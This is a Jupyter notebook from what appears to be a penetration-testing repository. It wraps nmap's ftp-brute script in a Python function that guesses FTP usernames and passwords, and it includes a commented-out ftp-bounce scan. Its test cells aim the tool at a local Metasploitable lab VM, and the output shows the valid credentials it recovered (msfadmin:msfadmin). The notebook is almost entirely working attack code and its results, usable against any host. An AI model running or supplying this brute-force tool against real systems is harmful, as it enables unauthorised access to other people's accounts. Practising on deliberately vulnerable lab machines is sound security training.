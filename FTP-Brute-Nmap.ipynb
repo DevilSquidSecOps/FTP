{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Modules"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-06-26T01:34:13.472103Z",
     "start_time": "2018-06-26T01:34:10.958137Z"
    }
   },
   "outputs": [],
   "source": [
    "import argparse, sys, threading, time\n",
    "from datetime import datetime\n",
    "from itertools import chain, product\n",
    "from ftplib import FTP\n",
    "import nmap\n",
    "import pandas as pd\n",
    "import ast\n",
    "import pprint\n",
    "pp = pprint.PrettyPrinter(indent=1)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Functions"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## FTP Brute Login Function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-06-26T01:34:17.684074Z",
     "start_time": "2018-06-26T01:34:17.362762Z"
    }
   },
   "outputs": [],
   "source": [
    "def ftp_brute(ipaddress,userdb=None,passdb=None):\n",
    "    if userdb == None:\n",
    "        userdb = '/usr/share/nmap/nselib/data/usernames.lst' #pass the default lists if none is supplied\n",
    "    if passdb == None:\n",
    "        passdb = '/usr/share/nmap/nselib/data/passwords.lst' #default passwords list\n",
    "    scanner = nmap.PortScanner()\n",
    "    targets = []\n",
    "    #ftp-brute will attempt a guess for every password in the passdb list for each username\n",
    "    #userdb/passdb is used to supply my own password list or the default will be used \n",
    "    #brute.emptypass=True will attempt empty passwords\n",
    "    #username as passwords guessing is on by default. Supply an empty passdb list and only this will be executed\n",
    "    scan1 = scanner.scan(hosts=ipaddress, arguments=f'''\n",
    "        --script ftp-brute\n",
    "        --script-args=userdb={userdb},passdb={passdb},brute.emptypass=True\n",
    "        -d -v -T5 -p 21\n",
    "        ''')#scan for ftp vulns using the scripts and attach associated arguments for them as needed\n",
    "#     scan1 = scanner.scan(hosts=ipaddress, arguments='--script ftp-bounce --script-args=ftp-bounce.password= ,ftp-bounce.checkhost=127.0.0.1 -p 21')#scan for ftp vulns using the scripts and attach associated arguments for them as needed\n",
    "    xml = scanner.get_nmap_last_output()    #GET XML OUTPUT\n",
    "    try:\n",
    "        df1 = pd.DataFrame(scan1)\n",
    "        a = scanner.command_line()\n",
    "        b = scanner.scaninfo()\n",
    "        c = scanner.scanstats()\n",
    "        d = scanner.all_hosts() #gets ip address\n",
    "        s = scan1['scan']\n",
    "\n",
    "        f = [d[0],a,b,c,s] #Add any values and then add a column name for it inside the columns \n",
    "        df2 = pd.DataFrame([f], columns=['IP','cmdLine','scaninfo','scanStats','scanData']) #make df of the d list holding the ip address to append to my df\n",
    "    #EXTRACT THE SCANDATA FIELDS AND PRINT IT\n",
    "        cmdline = df2['cmdLine'][0]\n",
    "        scaninfo = df2['scaninfo'][0]\n",
    "        hostnames = df2['scanData'][0][d[0]]['hostnames']\n",
    "        addresses = df2['scanData'][0][d[0]]['addresses']\n",
    "        vendor = df2['scanData'][0][d[0]]['vendor']\n",
    "        status = df2['scanData'][0][d[0]]['status']\n",
    "        print(\"Elapsed Time:\",df2['scanStats'][0]['elapsed']) #You can still pull keys out from the stored DF data even!\n",
    "        print(f\"IP/MAC: {addresses}\")\n",
    "        print(f\"status: {status}\")\n",
    "        print(f\"vendor: {vendor}\")\n",
    "        print(f\"Hostnames: {hostnames}\")\n",
    "        print(f\"{d}\")\n",
    "        print(f\"command: {cmdline}\\nscaninfo: {scaninfo}\")\n",
    "        return df1,df2,xml #returning three variables in form of a tuple \n",
    "    except Exception as e:\n",
    "        print(e)\n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## View scan data Function"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-06-26T01:34:20.393752Z",
     "start_time": "2018-06-26T01:34:20.372594Z"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "def ftp_vuln_data(df):\n",
    "#CHECK FTP SCAN DATA\n",
    "    ip = df['IP'][0] #pulls the ip used in the scan\n",
    "    a = df['scanData'][0][ip][\"tcp\"][21]\n",
    "    #Get only the FTP script Data\n",
    "#     b = df['scanData'][0][ip][\"tcp\"][21]['script'] #displays \n",
    "    print('\\n')\n",
    "    pp.pprint(a)\n",
    "#     print(f\"{a}\\n\\n{b}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Metasploitable Tests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-06-26T01:34:22.572171Z",
     "start_time": "2018-06-26T01:34:22.294839Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "msfadmin\r\n"
     ]
    }
   ],
   "source": [
    "!cat '/root/AttackScripts/usernames2.lst' #contains the one username for metasploitable\n",
    "!cat '/root/AttackScripts/passwords0.lst' #empty list"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-06-26T01:41:22.741487Z",
     "start_time": "2018-06-26T01:41:21.740878Z"
    },
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Elapsed Time: 0.87\n",
      "IP/MAC: {'ipv4': '192.168.1.143', 'mac': '00:0C:29:99:F5:12'}\n",
      "status: {'state': 'up', 'reason': 'arp-response'}\n",
      "vendor: {'00:0C:29:99:F5:12': 'VMware'}\n",
      "Hostnames: [{'name': '', 'type': ''}]\n",
      "['192.168.1.143']\n",
      "command: nmap -oX - --script ftp-brute --script-args=userdb=/root/AttackScripts/usernames2.lst,passdb=/root/AttackScripts/passwords0.lst,brute.emptypass=True -d -v -T5 -p 21 192.168.1.143\n",
      "scaninfo: {'tcp': {'method': 'syn', 'services': '21'}}\n"
     ]
    }
   ],
   "source": [
    "#TESTING AGAINST METASPLOITABLE BOX TO VERIFY SCRIPTS WORK\n",
    "host = '192.168.1.143'\n",
    "userdb = '/root/AttackScripts/usernames2.lst' #test list against metasploitable for msfadmin acct\n",
    "no_passwords = '/root/AttackScripts/passwords0.lst' #just an empty list to attempt guesses for usernames and usernames as the passwords\n",
    "df1_d,df2_d,xml_d = ftp_brute(host,userdb,no_passwords)#supply host and the usernames list file i want to use"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2018-06-26T01:41:25.860883Z",
     "start_time": "2018-06-26T01:41:25.834170Z"
    },
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\n",
      "{'conf': '3',\n",
      " 'cpe': '',\n",
      " 'extrainfo': '',\n",
      " 'name': 'ftp',\n",
      " 'product': '',\n",
      " 'reason': 'syn-ack',\n",
      " 'script': {'ftp-brute': '\\n'\n",
      "                         '  Accounts: \\n'\n",
      "                         '    msfadmin:msfadmin - Valid credentials\\n'\n",
      "                         '  Statistics: Performed 1 guesses in 1 seconds, '\n",
      "                         'average tps: 1.0'},\n",
      " 'state': 'open',\n",
      " 'version': ''}\n"
     ]
    }
   ],
   "source": [
    "#Read data from the scans\n",
    "ftp_vuln_data(df2_d)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "pentest",
   "language": "python",
   "name": "pentest"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "273px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
